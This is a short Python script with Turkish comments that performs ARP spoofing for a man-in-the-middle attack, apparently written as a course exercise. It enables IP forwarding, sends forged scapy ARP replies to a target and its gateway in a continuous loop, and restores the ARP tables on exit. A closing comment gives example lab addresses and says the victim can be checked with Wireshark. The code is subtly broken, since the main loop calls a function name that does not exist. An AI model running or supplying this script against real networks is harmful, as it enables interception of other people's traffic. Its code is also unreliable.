import os 
import scapy.all as scapy
import time
import optparse

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("ip_forward ayarlandı")

def giris():
    parse = optparse.OptionParser()
    parse.add_option("-t","--target",dest="hedef_ip",help="hedef ip giriniz!")
    parse.add_option("-r","--host",dest="modem_ip",help="modem ip giriniz!")

    ayarlar = parse.parse_args()[0]

    if not ayarlar.hedef_ip:
        print("bir tane hedef giriniz!")
    if not ayarlar.modem_ip:
        print("bir tane modem giriniz!")
    return ayarlar



def macbulucu(ip):
    istek_paket = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    yayin_paket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    paket = yayin_paket/istek_paket
    asilpaket = scapy.srp(paket,timeout=1, verbose=False)[0]
    return asilpaket[0][0].hwsrc #mac adresini verir.


def arpcevap(ip1,ip2):
    macbulduk = macbulucu(ip1)
    arp_cevap = scapy.ARP(op=2,pdst=ip1,hwdst=macbulduk,psrc=ip2)
    #scapy.ls(scapy.ARP())
    scapy.send(arp_cevap, verbose=False)


#temizleme işlemi bu 328. bölüm tekrar bakabilirsin.
def reset(ip11,ip22):
    macbulduk = macbulucu(ip11)
    digermac=macbulucu(ip22)
    arp_cevap = scapy.ARP(op=2,pdst=ip11,hwdst=macbulduk,psrc=ip22,hwsrc=digermac)
    scapy.send(arp_cevap, verbose=False,count=5)


sayac = 0

girdi = giris()
hedef = girdi.hedef_ip
modem = girdi.modem_ip
try:
    while True:
        arp_cevap(hedef, modem)
        arp_cevap(modem, hedef)

        sayac += 2
        print("\rGönderilen Paket: "+str(sayac),end="")
        time.sleep(2)  
except KeyboardInterrupt :
    print("\nçıkış yapılıyor...")
    reset(hedef,modem)
    reset(modem,hedef)


#kullanım örneği python3 mitm_attack.py -t 10.0.2.11 -r 10.0.2.1
#saldırılan kurbanda wireshark ile kontrol edebiliriz veya arp -a ile